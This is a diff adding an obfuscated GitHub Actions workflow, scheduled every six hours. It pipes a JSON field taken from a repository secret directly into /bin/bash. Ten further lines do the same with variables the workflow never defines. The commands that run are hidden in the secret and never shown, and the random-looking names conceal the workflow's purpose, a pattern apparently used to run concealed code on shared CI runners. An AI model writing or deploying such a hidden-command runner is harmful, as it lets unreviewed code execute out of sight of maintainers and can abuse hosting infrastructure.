@@ -1,0 +1,27 @@
+name: quanjingxin3910
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: quanjingxin3910
+        env:
+          oor48093: ${{ secrets.oor48093 }}
+        run: |
+          echo $oor48093 | jq -r .yfau87999 | /bin/bash
+          echo $svcjt16083 | jq -r .v91988 | /bin/bash
+          echo $ykhl6 | jq -r .dxael0088 | /bin/bash
+          echo $vfsfe59140 | jq -r .d9583 | /bin/bash
+          echo $rq36 | jq -r .gua2579 | /bin/bash
+          echo $zcpse46666 | jq -r .xs689 | /bin/bash
+          echo $iy87880 | jq -r .bd46137 | /bin/bash
+          echo $rqcz6680 | jq -r .osh1076 | /bin/bash
+          echo $zjw4 | jq -r .w92680 | /bin/bash
+          echo $an2025 | jq -r .u387 | /bin/bash
+          echo $wknga6 | jq -r .bdefz7059 | /bin/bash
+
